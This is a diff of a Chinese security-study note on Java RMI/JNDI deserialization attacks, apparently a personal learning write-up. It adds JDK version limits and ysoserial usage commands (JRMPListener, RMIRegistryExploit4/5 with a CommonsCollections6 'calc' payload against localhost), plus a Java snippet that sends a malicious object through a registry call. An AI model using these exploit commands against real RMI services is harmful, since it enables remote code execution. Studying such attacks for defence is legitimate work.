@@ -1,6 +1,8 @@
-## RMI和JNDI攻击向量
+# RMI和JNDI攻击向量
 
-### 客户端攻击服务端
+# RMI攻击向量
+
+## 客户端攻击服务端
 
 **情况1：**
 假设服务端存在一个公共的已知PublicKnown类（比如经典的Apache Common Collection，这里只是用PublicKnown做一个类比），它有readObject方法并且在readObject中存在命令执行的能力，所以我们客户端可以写一个与服务端包名，类名相同的类并继承Message类，通过远程函数调用传递恶意对象到服务端。
@@ -30,7 +32,7 @@ grant {
 
 ```
 
-### 服务端攻击客户端
+## 服务端攻击客户端
 
 **情况1：**
 服务端如果想要攻击客户端，那么利用点就是存在客户端反序列化服务端的返回值的时候，即客户端存在公共的已知PublicKnown类（比如经典的Apache Common Collection，这里只是用PublicKnown做一个类比），它有readObject方法并且在readObject中存在命令执行的能力，服务端通过返回值返回序列化的PublicKnown类型的对象。
@@ -63,7 +65,7 @@ reg.bind("Services", services);
     System.setProperty("java.rmi.server.useCodebaseOnly","false");
 ```
 
-### 攻击注册中心
+## 攻击注册中心
 ```java
 (1) 利用DGC攻击RMI Registry，可以通过与DGC通信的方式发送恶意payload让注册中心反序列化
 java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 9999 
@@ -86,7 +88,7 @@ java -cp target/ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit2 127.0.0.
 Registry对于bind/rebind的请求，会去检查这个请求是否为本地请求，对于外部的请求，Registry会拒绝该请求,所以如果要使用bind/rebind请求来远程攻击Registry，JDK版本必须在8u141之前
 ```
 ```java
-(3) 利用unbind/lookup请求攻击RMI Registry (绕过JDK版本必须在8u141之前的限制)
+(3) 利用unbind/lookup请求攻击RMI Registry (绕过JDK版本必须在8u141之前的限制，PS :　JDK>=8u232_b09 &&　JDK<=8u242，大于8u242的条件下也失效了，主要原因在于lookup接口无法再反序列化非string类型的object了)
 unbind和lookup实际上都会调用readObject来读取传递过来的参数，所以同样是可以利用的。
 
 不过这里有一个问题，当我们调用unbind或者lookup时，只允许我们传递字符串，所以没法传递我们的恶意对象。
@@ -117,11 +119,20 @@ RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898
 ObjectOutput var3 = var2.getOutputStream();
 var3.writeObject(remote);
 ref.invoke(var2);
+
+利用方式：
+//开启JRMPListener
+java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "calc"
+//发起攻击
+java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit4 127.0.0.1 1099 CommonsCollections6 "calc"
+或
+java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit5 127.0.0.1 1099 RMIConnectWrapped 127.0.0.1:8888
+或
+java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit5 127.0.0.1 1099 RMIConnectWithUnicastRemoteObject 127.0.0.1:8888
 ```
-```java
-(4) 
-```
-(4)
+
+# JDNI攻击向量
+
 
 
 https://blog.0kami.cn/2020/02/06/java/rmi-registry-security-problem/
